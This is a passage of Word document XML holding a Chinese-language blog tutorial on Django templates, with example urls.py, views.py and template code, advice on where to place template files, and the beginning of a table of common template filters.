        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django基础(4): 模板(Template)的设计及常用过滤器与标签介绍</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A86AE20" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00D96E02" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId245" w:history="1">
        <w:r w:rsidR="00995934" w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Python Web与Django开发</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00995934" w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t> 2018-05-22</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640C0C76" w14:textId="335825BB" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django网络应用开发的</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>5项基础核心技术</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>包括</w:t>
      </w:r>
      <w:hyperlink r:id="rId246" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>模型（Model）的设计</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId247" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>URL的设计与配置</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，</w:t>
      </w:r>
      <w:hyperlink r:id="rId248" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>View（视图）的编写</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>，Template（模板）的设计和Form(表单)的使用。今天小编我就来拼个老命给你来介绍下第四项Django核心基础知识之模板Template的设计吧, 并重点介绍下Django模板过滤器与标签。想持续了解后续Django Web开发技术请订阅我的公众号【</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Python与Django大咖之路</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D46EA67" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>什么是模板(Template)? Django的Template是如何工作的</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="649B3B98" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>Django的模板是静态的html文件，它只决定了一个页面的样式或外观。它需要视图View传递过来的变量(Variable)或内容对象(Context object)才能被渲染成一个完整的页面。这样做的好处是实现了样式与业务逻辑的分离，便于前端和后端Web开发人员各自完成自己的开发工作。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="324A2FAE" w14:textId="434489E3" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6313EA8B" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们先来看一个新闻博客的例子。当用户访问/blog/article/2/的时候，URL路由器会调用视图views.py的article_detail方法。article_detail所做的就是提取id=2的文章对象，通过render方法，将它传递到模板文件/blog/article_detail.html。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B35850C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t># blog/urls.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67CE0ADC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.urls import path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60274188" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5E8011A2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from . import views</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BCE4AD2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="37AC53D2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>urlpatterns = [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68C6B15C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">   path('blog/article/&lt;int:id&gt;/', views.article_detail, name='article_detail'),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8C8A84" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="531A696D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5F2147CC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t># blog/views.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C2A82FD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from django.shortcuts import render, get_object_or_404</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F124C86" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>from .models import Article</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62B73B13" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="167810DD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>def article_detail(request, id):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02732A4A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    article = get_object_or_404(Article, pk=id)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E19C984" w14:textId="172BB2B3" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    return render(request, 'blog/article_detail.html', {"article": article})</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E547977" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59C479A9" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下图是模板文件blog/article_detail.html的代码。在模板文件里我们可以通过双括号{{ article }} 显示变量或内容对象，还可以通过</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>点号（</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>）用来直接访问变量的属性。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="417F8A3D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% block content %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ECF73AF" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.title }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4A7647" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.pub_date }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11C5D89D" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{{ article.body }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="617C2168" w14:textId="1FA82CA7" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>{% endblock %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="721A8AE3" w14:textId="6E13BF9F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7F4F2D2F" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板(Template)文件的正确位置</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="650EE470" w14:textId="2D22F05C" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>对于html模板文件，我们建议放在app/templates/app/文件夹里，而不是简单放在app/templates/里。看似我们多加了一层文件夹使问题复杂化了，但这样做实际上更安全。这与Django查找模板文件的方法有关。因为我们多加了一层app，这样Django只会查找app文件夹里的模板文件。在views.py里我们也建议通过app/template_name.html调用template，这样会杜绝与其它同名template的冲突。更多内容见【</w:t>
      </w:r>
      <w:hyperlink r:id="rId249" w:anchor="wechat_redirect" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00995934">
          <w:rPr>
            <w:rFonts w:hint="eastAsia"/>
            <w:color w:val="008080"/>
          </w:rPr>
          <w:t>Django项目文件与文件夹的合理布局</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>】</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075E8A3D" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>模板过滤器Filter</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3891111D" w14:textId="4A77617F" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>您可以通过使用</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>过滤器</w:t>
      </w:r>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>来改变变量在模板中的显示。比如{{ article.title | lower }} 中lower过滤器可以让文章的标题转化为小写。Django的模板提供了许多内置过滤器，你可以直接使用，非常方便。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304A6991" w14:textId="77777777" w:rsidR="00995934" w:rsidRPr="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00995934">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下面是一些Django模板常用过滤器。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="10155" w:type="dxa"/>
        <w:jc w:val="center"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2894"/>
        <w:gridCol w:w="7261"/>
      </w:tblGrid>
      <w:tr w:rsidR="00995934" w14:paraId="3ECEB40D"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1C0A5F6" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934" w:rsidP="00995934">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode30"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>过滤器</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6AB9061" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode31"/>
                <w:b/>
                <w:bCs/>
                <w:color w:val="FFA900"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>例子</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="407A6DA1"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ADE3642" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>lower, upper</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9D44C28" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode32"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">{{ article.title | lower }} </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode32"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t>大小写</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00995934" w14:paraId="78F48734"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3CC7DD3" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
              </w:rPr>
              <w:t>length</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703D44E" w14:textId="77777777" w:rsidR="00995934" w:rsidRDefault="00995934">
            <w:pPr>
              <w:wordWrap w:val="0"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode33"/>
                <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
                <w:color w:val="888888"/>
                <w:sz w:val="18"/>
                <w:szCs w:val="18"/>
                <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              </w:rPr>
              <w:t xml:space="preserve">{{ name | length }} </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="jsdarkmode33"/>
